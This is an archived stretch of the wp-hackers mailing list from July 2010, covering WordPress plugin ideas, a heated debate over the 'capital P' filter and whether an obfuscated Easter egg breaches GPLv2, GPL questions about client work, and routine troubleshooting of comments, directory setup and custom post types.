http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From skeltoac at gmail.com  Wed Jul  7 17:34:54 2010
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed, 7 Jul 2010 12:34:54 -0500
Subject: [wp-hackers] Filter Visualization
In-Reply-To: <1078736248.136355.1278519160456.JavaMail.open-xchange@oxusltgw11.schlund.de>
References: <1078736248.136355.1278519160456.JavaMail.open-xchange@oxusltgw11.schlund.de>
Message-ID: <AANLkTik48TnZ7JjnIUxm-Q9PZh6Fhn8gexlhQkJsyp9X@mail.gmail.com>

On Wed, Jul 7, 2010 at 11:12 AM, Eric Mann <eric at eamann.com> wrote:
> My idea: A plug-in allows you to see all filters currently being used on the
> site and selectively turn them on or off without touching the code.

That's a good idea for a plugin. There are many odd cases you might
not anticipate: filters added conditionally or very late, filters that
will break the site when disabled, etc. I'll be interested to see how
you work around those.

Just peeking at apply_filters, I think you'll get a lot of mileage out
of the 'all' filter for tag discovery.

I'm curious: did you intend to be able to turn off entire tags as well
as individual filters?

Andy

From jeffc at wptavern.com  Wed Jul  7 17:38:30 2010
From: jeffc at wptavern.com (Jeff Chandler)
Date: Wed, 07 Jul 2010 13:38:30 -0400
Subject: [wp-hackers] Putting the P in WordPress
Message-ID: <4C34BB96.1030408@wptavern.com>

  I've been looking high and low and can not find the ticket in Trac for the WordPress Capital P filter as an enhancement to be added to the core. If one exists, please show me the link. It would have been much more productive (I think) to have a discussion on that particular ticket, especially before it was committed versus the huge thread on this mailing list. We could have had an appropriate outlet to discuss the pros-cons of the proposed implementation of the filter and who knows, depending on how the implementation was coded, it could have turned out to be a non issue so long as it didn't break anything.

So for those complaining about the list turning into crap thanks to this long winded thread, lets give credit where credit is due and that is the lack of a ticket to comment on preferably BEFORE the patch was committed.

From jbloch at olympianetworks.com  Wed Jul  7 17:39:56 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Wed, 7 Jul 2010 13:39:56 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C34BB96.1030408@wptavern.com>
References: <4C34BB96.1030408@wptavern.com>
Message-ID: <4F470142-969E-47E7-B8C4-3691C60D2A53@olympianetworks.com>

http://core.trac.wordpress.org/changeset/14996

On Jul 7, 2010, at 1:38 PM, Jeff Chandler wrote:

> I've been looking high and low and can not find the ticket in Trac for the WordPress Capital P filter as an enhancement to be added to the core. If one exists, please show me the link. It would have been much more productive (I think) to have a discussion on that particular ticket, especially before it was committed versus the huge thread on this mailing list. We could have had an appropriate outlet to discuss the pros-cons of the proposed implementation of the filter and who knows, depending on how the implementation was coded, it could have turned out to be a non issue so long as it didn't break anything.
> 
> So for those complaining about the list turning into crap thanks to this long winded thread, lets give credit where credit is due and that is the lack of a ticket to comment on preferably BEFORE the patch was committed.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jbloch at olympianetworks.com  Wed Jul  7 17:40:42 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Wed, 7 Jul 2010 13:40:42 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C34BB96.1030408@wptavern.com>
References: <4C34BB96.1030408@wptavern.com>
Message-ID: <64E09435-3D08-4AEA-8F14-1319D8A0D54F@olympianetworks.com>

Sorry, just realized you wanted the ticket, not the changeset.

On Jul 7, 2010, at 1:38 PM, Jeff Chandler wrote:

> I've been looking high and low and can not find the ticket in Trac for the WordPress Capital P filter as an enhancement to be added to the core. If one exists, please show me the link. It would have been much more productive (I think) to have a discussion on that particular ticket, especially before it was committed versus the huge thread on this mailing list. We could have had an appropriate outlet to discuss the pros-cons of the proposed implementation of the filter and who knows, depending on how the implementation was coded, it could have turned out to be a non issue so long as it didn't break anything.
> 
> So for those complaining about the list turning into crap thanks to this long winded thread, lets give credit where credit is due and that is the lack of a ticket to comment on preferably BEFORE the patch was committed.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From kikizas at gmail.com  Wed Jul  7 17:42:01 2010
From: kikizas at gmail.com (Demetris)
Date: Wed, 7 Jul 2010 20:42:01 +0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinjWXFvhqCaQEWUrIiN3i-LESqJ-BBK8z1OZECE@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
	<AANLkTinjWXFvhqCaQEWUrIiN3i-LESqJ-BBK8z1OZECE@mail.gmail.com>
Message-ID: <AANLkTikhfcWpcpnCIh9h_yqAqjC8xMQm2h7BdMrhJ_xr@mail.gmail.com>

On Wed, Jul 7, 2010 at 6:28 PM, Doug Stewart <zamoose at gmail.com> wrote:
> On 7/7/10, Matt Mullenweg <m at mullenweg.com> wrote:
>> Eventually, the good people unsubscribe entirely, or go silent for
>> months/years at a time. Why? Because they didn't get involved with
>> WordPress because they love arguing on mailing lists. I'm involved
>> because I love making it easy for people to build beautiful dynamic
>> websites. I'm involved because I think the more people publishing, the
>> better place the world will be. I'm involved because I love figuring out
>> elegant code or architecture solutions to tricky problems or UI challenges.
>>
>
> Your suggestion that those who disagree with you DON'T value those
> things truly rankles. ?If you're trying to engender reasoned debate
> and healthy contributions, publicly impugning others' motives is a
> lousy way to start.
>
I think Matt simply enjoys insulting, in indirect ways, those who
disagree with him.  (Some of whom, in this case, also happen to be
regular contributors to the project Matt leads.)

He has done that so many times in this thread, even after it was
pointed out by several people, that I don?t believe it can be
attributed any more to accident or misinterpreted intent.

Cheers!

Demetris
http://op111.net/76 ? See what is new in WordPress 3.0!

From austin at ilfilosofo.com  Wed Jul  7 17:50:48 2010
From: austin at ilfilosofo.com (Austin Matzko)
Date: Wed, 7 Jul 2010 12:50:48 -0500
Subject: [wp-hackers] Fwd: Re: Putting the P in WordPress
In-Reply-To: <0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
Message-ID: <AANLkTimXURYH4OcvEVstqWnBoF0lbvllR5aM_AkqJMEm@mail.gmail.com>

On Wed, Jul 7, 2010 at 12:26 PM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
> I believe the specific wording from the GPL2 you are interpreting is:
>
> "The source code for a work means the preferred form of the work for making modifications to it. For an executable work, complete source code means all the source code for all modules it contains, plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable. However, as a special exception, the source code distributed need not include anything that is normally distributed (in either source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable runs, unless that component itself accompanies the executable. "
>
> In my reading in no way does this preclude the distribution of obfuscated code - what it is trying to prevent is the distribution of compiled object files without the corresponding source code to allow modifications to be made.

The FSF disagrees:

> Therefore, accessibility of source code is a necessary condition for free software. Obfuscated ?source code? is not real source code and does not count as source code.[1]

On Wed, Jul 7, 2010 at 12:26 PM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
> As JS and PHP are always distributed in source form as part of the WordPress download I don't see how we are violating the licence.
>
> Would you consider it a licence violation if we were to ship WordPress without the include .dev.js files so as to decrease the download size and make automatic upgrades use less memory?

According to the GPL, you must make the original source available to
the users.  The *dev.js files provide that through several means;
there is no corresponding dev file available for the Matrix Easter Egg
publicly.

[1] http://www.gnu.org/philosophy/free-sw.html

From eckman.john at gmail.com  Wed Jul  7 17:57:55 2010
From: eckman.john at gmail.com (John Eckman)
Date: Wed, 7 Jul 2010 13:57:55 -0400
Subject: [wp-hackers] wp_new_comment($commentdata) ignores timestamp?
Message-ID: <4A340A90-98D3-4B00-9833-96A8FC39A756@gmail.com>

Working on a revision to my wpbook plugin that, among other things, imports comments from excerpts posted on FB walls. 

As a result, I end up inside a cron-called function, with an array of comment data to insert. 

If I go directly to wp_insert_comment($data) everything is kosher, but I'm bypassing other filters that might want to act on comment content, no notifications to the blog author (new comment posted!) fires, etc - basically I sneak the comment into the DB but that feels wrong. 

If I use wp_new_comment($data), it ignores the timestamp I'm setting. (The timestamp of "now" in the sense of when cron is running may not be the right timestamp for the post, which may have been yesterday). 

Is there a way to use wp_new_comment() but force it to accept a timestamp if one is passed in?

I suppose I could also just call wp_filter_comment() and then wp_insert_comment() so that at least filters get run - but will that cause notifications to fire?


----------------------------------------
John Eckman
eckman.john at gmail.com
http://www.johneckman.com/






From umassthrower at gmail.com  Wed Jul  7 17:58:06 2010
From: umassthrower at gmail.com (Jeff Jason)
Date: Wed, 7 Jul 2010 13:58:06 -0400
Subject: [wp-hackers] Fwd: Re: Putting the P in WordPress
In-Reply-To: <0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
Message-ID: <AANLkTimtkKdCub18oAovWVmtIFraXRFdcRYgOV2Gu7YS@mail.gmail.com>

So obfuscating code would violate "The source code for a work means the
preferred form of the work for making modifications to it."
But why is this even in question, nothing has been obfuscated.


I feel like this is an argument between people who have just gotten used to
being right a lot in their lives and are too stubborn to give up.  I'm a
pretty stubborn, opinionated, and "used to being right a lot" kind of guy
and I would have given up arguing on this thread 3 times over already if I
had an opinion.  This is getting so ridiculous that I'm starting to feel
like I'm being foolish for having such a strong meta-opinion about all of
your opinions.


In any event.  When you write software decisions need to be made.  I have
seen the effects of allowing a pure democracy to pollute software unckecked.
 The fact of the matter is there needs to be a a core of good developers who
are close to the project and are given the authority to make these decisions
without being required to give in to tyranny of the majority.  Every day
more significant decisions than this are made in support of this and other
pieces of software that are more incorrect than this one.  These decisions
pass by un-noticed because they are not nearly as easily consumable as The
Great Capital capital_P_dangit debate of 2010.  I personally think
spellcheck is a much better implementation; but, I have not been here for
the past X years working and being involved in this project.  I've looked at
the list of bugs that this filter causes and they are all cases where the
user should have either been using WordPress or wordpress to begin with.
 For people with the personal preference to not have their blogs be affected
by this you have the option of changing it yourself, writing a plugin, or
hell branch the code and maintain your own project.  You don't have to feel
like you need to stand up for the poor user who is going to be violated by
having their freedom of speech taken away by this tyrannical filter.  Give
me a break.

I will be leaving the code in or perhaps writing
the aforementioned spellchecker plugin.  In the end the emotion and politics
need to be toned down and this discussion needs to be closed.  The proper
action is no action on this bug.

-J


On Wed, Jul 7, 2010 at 1:26 PM, Peter Westwood <peter.westwood at ftwr.co.uk>wrote:

>
> On 7 Jul 2010, at 16:05, Mark E wrote:
>
> > The obfuscation of the easter egg blatantly violates GPL v2. So all the
> > stuff you say about GPL boils down to this: "Do as I as say, not as I
> > do". And here I was thinking that you followed GPL to the letter, as you
> imply other people should do.
>
>
> In what way?
>
> I believe the specific wording from the GPL2 you are interpreting is:
>
> "The source code for a work means the preferred form of the work for making
> modifications to it. For an executable work, complete source code means all
> the source code for all modules it contains, plus any associated interface
> definition files, plus the scripts used to control compilation and
> installation of the executable. However, as a special exception, the source
> code distributed need not include anything that is normally distributed (in
> either source or binary form) with the major components (compiler, kernel,
> and so on) of the operating system on which the executable runs, unless that
> component itself accompanies the executable. "
>
> In my reading in no way does this preclude the distribution of obfuscated
> code - what it is trying to prevent is the distribution of compiled object
> files without the corresponding source code to allow modifications to be
> made.
>
> As JS and PHP are always distributed in source form as part of the
> WordPress download I don't see how we are violating the licence.
>
> Would you consider it a licence violation if we were to ship WordPress
> without the include .dev.js files so as to decrease the download size and
> make automatic upgrades use less memory?
>
> Cheers
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeff Jason II

From austin at ilfilosofo.com  Wed Jul  7 18:01:43 2010
From: austin at ilfilosofo.com (Austin Matzko)
Date: Wed, 7 Jul 2010 13:01:43 -0500
Subject: [wp-hackers] Fwd: Re: Putting the P in WordPress
In-Reply-To: <AANLkTimtkKdCub18oAovWVmtIFraXRFdcRYgOV2Gu7YS@mail.gmail.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<AANLkTimtkKdCub18oAovWVmtIFraXRFdcRYgOV2Gu7YS@mail.gmail.com>
Message-ID: <AANLkTikPfXrwgJnqnL7yhw8LITKj8h0m4n17ROU0ZI4-@mail.gmail.com>

On Wed, Jul 7, 2010 at 12:58 PM, Jeff Jason <umassthrower at gmail.com> wrote:
> So obfuscating code would violate "The source code for a work means the
> preferred form of the work for making modifications to it."
> But why is this even in question, nothing has been obfuscated.

The obfuscation is of the Easter Egg code[1], not the capital P dangit code.

[1] See wp-admin/js/revisions-js.php

From skeltoac at gmail.com  Wed Jul  7 18:02:11 2010
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed, 7 Jul 2010 13:02:11 -0500
Subject: [wp-hackers] How obfuscated code can respect GPLv2
Message-ID: <AANLkTinNjnwx5rtHmMU6_BS6HrsOgKJXPXJ5qHTa7bHR@mail.gmail.com>

"The source code for a work means the preferred form of the work for
making modifications to it."

Nobody prefers to work on code in obfuscated, minified, or otherwise
unreadable form. Thus the "source code", that which is human-readable,
must also be distributed. That doesn't mean you are compelled to
include the human-readable source code in the download:

"If distribution of executable or object code is made by offering
access to copy from a designated place, then offering equivalent
access to copy the source code from the same place counts as
distribution of the source code, even though third parties are not
compelled to copy the source along with the object code."

Obfuscated code is "executable" and not "source code". It would
suffice to place the executable's source code in the repository. This
is likewise true for minified code; we don't have to include the dev
files in the download. If we remove them, we should simultaneously
begin to offer a "dev download" so that svn is not a prerequisite for
hacking the source.

The blue pill gag is old enough that we can dispense with the
obfuscation. At the very least, its source code must be published, at
least to the svn repository linked to the download page.

In future, we must not commit obfuscated code without also committing
source code so that it is available for download.

I don't see any material harm in the violation. But it does slightly
soil our reputation and we should come clean and do better.

Andy

From elizabeth at slatetechpdx.com  Wed Jul  7 18:35:24 2010
From: elizabeth at slatetechpdx.com (Elizabeth Buckwalter)
Date: Wed, 7 Jul 2010 11:35:24 -0700
Subject: [wp-hackers] Filter Visualization
Message-ID: <AANLkTil2cpnwBm_QpKz_-Kr7gmF2cjZVvS08QHzhTvyw@mail.gmail.com>

On Wed, 7 Jul 2010 09:12 AM,  Eric Mann <eric at eamann.com> wrote:
> Subject: [wp-hackers] Filter Visualization

[snip]

> My idea: A plug-in allows you to see all filters currently being used on the
> site and selectively turn them on or off without touching the code. This would
> give power users the ability to quickly shut off filters they don't like, and
> would allow lay users to disable new features that might break a legacy site.

> Do you see any value in a plug-in like this? ?Why or why not?
>
> ~Eric Mann
>
>

 I'm coming from the perspective of developing for clients.  Once it
does what they want it to they don't want to change anything but the
content.  That said, I have often wanted a quick way to view a list of
the filters to track down who what when where why things are
happening.  Usually, it's because one filter is messing up another
filter.  I constantly forget where I put the code, so I must Google it
again for another project.   Having a quick way to turn them off would
be nice.

I personally wouldn't use it for production, because there are so many
filters, it seems like it would slow a site down.  It may only be
milliseconds, but milliseconds can add up to seconds very quickly on
large sites.

In conclusion, I would love this plugin, but only for development purposes.

-- 
Thanks,
Elizabeth Buckwalter

From peter.westwood at ftwr.co.uk  Wed Jul  7 18:50:15 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 7 Jul 2010 19:50:15 +0100
Subject: [wp-hackers] Fwd: Re: Putting the P in WordPress
In-Reply-To: <AANLkTimXURYH4OcvEVstqWnBoF0lbvllR5aM_AkqJMEm@mail.gmail.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<AANLkTimXURYH4OcvEVstqWnBoF0lbvllR5aM_AkqJMEm@mail.gmail.com>
Message-ID: <50A0242E-0756-4834-BA3D-97CBC3F6E01E@ftwr.co.uk>


On 7 Jul 2010, at 18:50, Austin Matzko wrote:

> On Wed, Jul 7, 2010 at 12:26 PM, Peter Westwood
> <peter.westwood at ftwr.co.uk> wrote:
>> I believe the specific wording from the GPL2 you are interpreting is:
>> 
>> "The source code for a work means the preferred form of the work for making modifications to it. For an executable work, complete source code means all the source code for all modules it contains, plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable. However, as a special exception, the source code distributed need not include anything that is normally distributed (in either source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable runs, unless that component itself accompanies the executable. "
>> 
>> In my reading in no way does this preclude the distribution of obfuscated code - what it is trying to prevent is the distribution of compiled object files without the corresponding source code to allow modifications to be made.
> 
> The FSF disagrees:
> 
>> Therefore, accessibility of source code is a necessary condition for free software. Obfuscated ?source code? is not real source code and does not count as source code.[1]
> 
> On Wed, Jul 7, 2010 at 12:26 PM, Peter Westwood
> <peter.westwood at ftwr.co.uk> wrote:
>> As JS and PHP are always distributed in source form as part of the WordPress download I don't see how we are violating the licence.
>> 
>> Would you consider it a licence violation if we were to ship WordPress without the include .dev.js files so as to decrease the download size and make automatic upgrades use less memory?
> 
> According to the GPL, you must make the original source available to
> the users.  The *dev.js files provide that through several means;
> there is no corresponding dev file available for the Matrix Easter Egg
> publicly.
> 
> [1] http://www.gnu.org/philosophy/free-sw.html
> 

Thank you for digging up what I couldn't find.

Personally, I still don't see a strong violation of the licence but neither do I have any issue with providing the source to the code as part of WordPress.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From wp at andrewnacin.com  Wed Jul  7 18:52:05 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 7 Jul 2010 14:52:05 -0400
Subject: [wp-hackers] Export errors (3.0 / multisite)
In-Reply-To: <1614E53E-C7A4-4272-86C4-CBE5381CF078@thisismyurl.com>
References: <1614E53E-C7A4-4272-86C4-CBE5381CF078@thisismyurl.com>
Message-ID: <AANLkTikug5Bs4jINl0z68vOAT6bbaPdIPcpr5K0b4fgT@mail.gmail.com>

On Wed, Jul 7, 2010 at 11:18 AM, Christopher Ross <cross at thisismyurl.com>wrote:

> This is the first time I've tried doing an export since the 3.0 update, is
> anybody else seeing an error like this or is it specific to my
> configuration?
>

This is fixed in 3.0.1. Based on some testing, it should still produce an
export file on the vast majority of setups, and also, WordPress had no
problems importing the file.

From elizabeth at slatetechpdx.com  Wed Jul  7 18:58:33 2010
From: elizabeth at slatetechpdx.com (Elizabeth Buckwalter)
Date: Wed, 7 Jul 2010 11:58:33 -0700
Subject: [wp-hackers] WordPress and GPL (was: Putting the P in WordPress)
Message-ID: <AANLkTikstBxwZGpEc694sLSIVZa5OToDIDa4GbTCnI5t@mail.gmail.com>

On Wed, 7 Jul 2010 12:50 AM,  Austin Matzko <austin at ilfilosofo.com> wrote:

> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>
> On Wed, Jul 7, 2010 at 12:26 PM, Peter Westwood <peter.westwood at ftwr.co.uk> wrote:
>> I believe the specific wording from the GPL2 you are interpreting is:
>>
>> "The source code for a work means the preferred form of the work for making modifications to it. For an executable work, complete source code means all the source code for all modules it contains, plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable. However, as a special exception, the source code distributed need not include anything that is normally distributed (in either source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable runs, unless that component itself accompanies the executable. "
>>
>> In my reading in no way does this preclude the distribution of obfuscated code - what it is trying to prevent is the distribution of compiled object files without the corresponding source code to allow modifications to be made.
>
> The FSF disagrees:
>
>> Therefore, accessibility of source code is a necessary condition for free software. Obfuscated ?source code? is not real source code and does not count as source code.[1]
>
>> As JS and PHP are always distributed in source form as part of the WordPress download I don't see how we are violating the licence.
>>
>> Would you consider it a licence violation if we were to ship WordPress without the include .dev.js files so as to decrease the download size and make automatic upgrades use less memory?
>
> According to the GPL, you must make the original source available to
> the users. ?The *dev.js files provide that through several means;
> there is no corresponding dev file available for the Matrix Easter Egg
> publicly.
>
> [1] http://www.gnu.org/philosophy/free-sw.html
>

You two seem familiar with the GPL with regards to WordPress.
Hypothetical situation:

Company A develops a website based on WordPress for Company B.
Company B claims that all the software developed by Company A for
Company B is proprietary information despite being mostly based on
GPL'd code.

Two examples where that I am curious about:

1) An established plugin from the plugin directory that had a bug
fixed by Company A during the development of Company B's website
cannot be released as it violates the NDA between Company A and
Company B.

2) Company B developed a new plugin that is loosely based on many
other plugins (plus one that is private code who's owner gave express
permission to use it only for this plugin).

As I understand the GPL, the code does not have to be publicly
available, but if someone asks for it, the altered code must be
provided. Would this also apply to the new plugin, as it is developed
for GPL'd software?  I know that wpmudev.org has plugins for pay, but
I can't seem to find their licensing information.  I also know that,
to have a plugin in the plugin directory, it must be GPL'd.

Again, this is a purely hypothetical conversation, where I am looking
for your (and the rest of the hackers list) opinions.  Your help is
greatly appreciated!

-- 
Thanks,
Elizabeth Buckwalter

From kikizas at gmail.com  Wed Jul  7 19:10:29 2010
From: kikizas at gmail.com (Demetris)
Date: Wed, 7 Jul 2010 22:10:29 +0300
Subject: [wp-hackers] WordPress and GPL (was: Putting the P in WordPress)
In-Reply-To: <AANLkTikstBxwZGpEc694sLSIVZa5OToDIDa4GbTCnI5t@mail.gmail.com>
References: <AANLkTikstBxwZGpEc694sLSIVZa5OToDIDa4GbTCnI5t@mail.gmail.com>
Message-ID: <AANLkTimwgOaYFsPHHMR7OnOgdIcDy375Rd52te_npxSu@mail.gmail.com>

On Wed, Jul 7, 2010 at 9:58 PM, Elizabeth Buckwalter
<elizabeth at slatetechpdx.com> wrote:
>
> As I understand the GPL, the code does not have to be publicly
> available, but if someone asks for it, the altered code must be
> provided. [SNIP]

No!

See section ?General understanding of the GPL?, second question:

http://www.gnu.org/licenses/old-licenses/gpl-2.0-faq.html

Cheers!

Demetris
http://op111.net/76 ? See what is new in WordPress 3.0!

From peter.westwood at ftwr.co.uk  Wed Jul  7 20:19:55 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 7 Jul 2010 21:19:55 +0100
Subject: [wp-hackers] WordPress and GPL (was: Putting the P in WordPress)
In-Reply-To: <AANLkTikstBxwZGpEc694sLSIVZa5OToDIDa4GbTCnI5t@mail.gmail.com>
References: <AANLkTikstBxwZGpEc694sLSIVZa5OToDIDa4GbTCnI5t@mail.gmail.com>
Message-ID: <B4AE2C15-A677-41AD-93D1-184EC36F5F4D@ftwr.co.uk>


On 7 Jul 2010, at 19:58, Elizabeth Buckwalter wrote:

> You two seem familiar with the GPL with regards to WordPress.
> Hypothetical situation:
> 
> Company A develops a website based on WordPress for Company B.
> Company B claims that all the software developed by Company A for
> Company B is proprietary information despite being mostly based on
> GPL'd code.
> 
> Two examples where that I am curious about:
> 
> 1) An established plugin from the plugin directory that had a bug
> fixed by Company A during the development of Company B's website
> cannot be released as it violates the NDA between Company A and
> Company B.
> 
> 2) Company B developed a new plugin that is loosely based on many
> other plugins (plus one that is private code who's owner gave express
> permission to use it only for this plugin).
> 
> As I understand the GPL, the code does not have to be publicly
> available, but if someone asks for it, the altered code must be
> provided. Would this also apply to the new plugin, as it is developed
> for GPL'd software?  I know that wpmudev.org has plugins for pay, but
> I can't seem to find their licensing information.  I also know that,
> to have a plugin in the plugin directory, it must be GPL'd.
> 
> Again, this is a purely hypothetical conversation, where I am looking
> for your (and the rest of the hackers list) opinions.  Your help is
> greatly appreciated!


It depends on whether or not /distribution/ has happened from what I understand.

In general if you are doing work for hire then distribution doesn't occur - and the ownership of the work done for hire would normal transfer to the client.

So in case (1) the work is done specifically on the instance of the plugin installed and it is never distributed so you don't have to share the code.
Realistically though I would always encourage the customer that it is in there long term interest to provide the bug fix back to the community as it gives them a path forward to newer versions of the plugin.

(2) is really no different if distribution occurs.

The key thing with the GPL code is that when it is /distributed/ you can't apply any restrictions on further distribution so if I sell you a GPL plugin I can't stop you giving it our for free.

However, just because the code is being distributed does not give anyone the right to demand it for free.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From lox.dev at knc.nc  Wed Jul  7 22:01:04 2010
From: lox.dev at knc.nc (Lox)
Date: Thu, 8 Jul 2010 09:01:04 +1100
Subject: [wp-hackers] Wordpress in its own directory: fail
Message-ID: <AANLkTilatpZ1UJkvakQcB_p-g4XXbbUTBa7Ns3JQt3g5@mail.gmail.com>

Hello,

Seems it is no more possible to run WP3 in  its own directory

I have followed the guide here:
http://codex.wordpress.org/Giving_WordPress_Its_Own_Directory

- Installed a fresh copy of wordpress 3.0 in
http://mydevserver/Mysite.com/htdocs, setup database etc. and login

- Connect to admin and change Wordpress url (siteurl) to
http://mydevserver/Mysite.com/htdocs/wp

- Created a /Mysite.com/htdocs/wp dir and moved all wordpress files in it

- Copied /Mysite.com/htdocs/wp/index.php to /Mysite.com/htdocs/

- Edited it as it: require('./wp/wp-blog-header.php');

- I then went to /Mysite.com/htdocs/wp/wp-admin

- And looked at an ugly error:

Warning: require_once(/var/www/Mysite.com/htdocs/wp-load.php): failed
to open stream: No such file or directory in
/var/www/Mysite.com/htdocs/wp-admin/admin.php on line 20

Call Stack:
    0.0000     317204   1. {main}()
/var/www/Mysite.com/htdocs/wp-admin/index.php:0
    0.0001     329460   2.
require_once('/var/www/Mysite.com/htdocs/wp-admin/admin.php')
/var/www/Mysite.com/htdocs/wp-admin/index.php:10


Fatal error: require_once(): Failed opening required
'/var/www/Mysite.com/htdocs/wp-load.php'
(include_path='.:/usr/share/php:/usr/share/pear') in
/var/www/Mysite.com/htdocs/wp-admin/admin.php on line 20

Call Stack:
    0.0000     317204   1. {main}()
/var/www/Mysite.com/htdocs/wp-admin/index.php:0
    0.0001     329460   2.
require_once('/var/www/Mysite.com/htdocs/wp-admin/admin.php')
/var/www/Mysite.com/htdocs/wp-admin/index.php:10

-- 
Lox
lox.dev at knc.nc

From eric at eamann.com  Wed Jul  7 22:03:09 2010
From: eric at eamann.com (Eric Mann)
Date: Wed, 7 Jul 2010 15:03:09 -0700 (PDT)
Subject: [wp-hackers] Filter Visualization
In-Reply-To: <AANLkTik48TnZ7JjnIUxm-Q9PZh6Fhn8gexlhQkJsyp9X@mail.gmail.com>
References: <1078736248.136355.1278519160456.JavaMail.open-xchange@oxusltgw11.schlund.de>
	<AANLkTik48TnZ7JjnIUxm-Q9PZh6Fhn8gexlhQkJsyp9X@mail.gmail.com>
Message-ID: <1397503028.147438.1278540189433.JavaMail.open-xchange@oxusltgw11.schlund.de>

Actually, I was just floating the idea to start. ?I could look into disabling
entire tags.
?
Really, I just want kind of a "debug dashboard" where I could see all the
various filters working in the background and tune things appropriately.
?
I'm not sure whether or not this would be a good thing to apply to actions ...
so I'll start with filters before getting too ambitious :-)
?
On July 7, 2010 at 5:34 PM Andy Skelton <skeltoac at gmail.com> wrote:

> On Wed, Jul 7, 2010 at 11:12 AM, Eric Mann <eric at eamann.com> wrote:
> > My idea: A plug-in allows you to see all filters currently being used on the
> > site and selectively turn them on or off without touching the code.
>
> That's a good idea for a plugin. There are many odd cases you might
> not anticipate: filters added conditionally or very late, filters that
> will break the site when disabled, etc. I'll be interested to see how
> you work around those.
>
> Just peeking at apply_filters, I think you'll get a lot of mileage out
> of the 'all' filter for tag discovery.
>
> I'm curious: did you intend to be able to turn off entire tags as well
> as individual filters?
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wphackers at jakemgold.myfastmail.com  Wed Jul  7 22:05:29 2010
From: wphackers at jakemgold.myfastmail.com (Jake Goldman)
Date: Wed, 07 Jul 2010 18:05:29 -0400
Subject: [wp-hackers] Adding built in taxonomies to custom post types
Message-ID: <4C34FA29.1020401@jakemgold.myfastmail.com>

  Anybody here have any luck adding the built in taxonomies (post_tags, 
category) to a custom taxonomy?

Haven't dug in too deeply, but using the code below I haven't been able 
to get the "category" taxonomy added to this simple post type:

register_post_type('glossary',array(
     'label' => 'Glossary',
     'description' => 'The lingo',
     'public' => true,
     'capability_type' => 'page',
     'supports' => array('title','editor'),
     'menu_position' => 20,
     'taxonomies' => array('category')
));

Note that I can add new and custom taxonomies (of any sort) without an 
issue.

Before I spend too much time digging, hoping someone else is aware of 
this / has run into this...

Jake

From mccormicky at gmail.com  Wed Jul  7 22:21:35 2010
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 7 Jul 2010 18:21:35 -0400
Subject: [wp-hackers] Wordpress in its own directory: fail
In-Reply-To: <AANLkTilatpZ1UJkvakQcB_p-g4XXbbUTBa7Ns3JQt3g5@mail.gmail.com>
References: <AANLkTilatpZ1UJkvakQcB_p-g4XXbbUTBa7Ns3JQt3g5@mail.gmail.com>
Message-ID: <AANLkTimkA1C0IKOzoTdGTzj1g7yVjmHJbwFSjQ1TK9qf@mail.gmail.com>

1st step is to change  WordPress location in Settings >> General then copy
the files to the new directory
if I am not mistaken.

On Wed, Jul 7, 2010 at 6:01 PM, Lox <lox.dev at knc.nc> wrote:

> Hello,
>
> Seems it is no more possible to run WP3 in  its own directory
>
> I have followed the guide here:
> http://codex.wordpress.org/Giving_WordPress_Its_Own_Directory
>
